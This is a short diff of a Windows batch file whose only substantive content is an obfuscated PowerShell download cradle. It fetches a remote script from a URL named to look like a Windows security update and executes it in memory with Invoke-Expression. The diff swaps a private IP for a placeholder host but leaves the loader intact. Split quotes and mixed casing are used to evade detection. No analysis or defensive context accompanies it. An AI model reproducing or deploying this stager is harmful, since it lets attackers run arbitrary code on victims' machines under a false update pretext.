@@ -1,4 +1,4 @@
 @ECHO OFF
 setlocal
-set URL=http://192.168.1.3:8000/WinSecurityUpdate
+set URL=http://XXXXX:8000/WinSecUp
 po""weR""sHelL -nO""p -c "& { $URL = '%URL%'; iEx(New-Object Net.WEbclIent).DoWnLOadstRinG($URL)}"
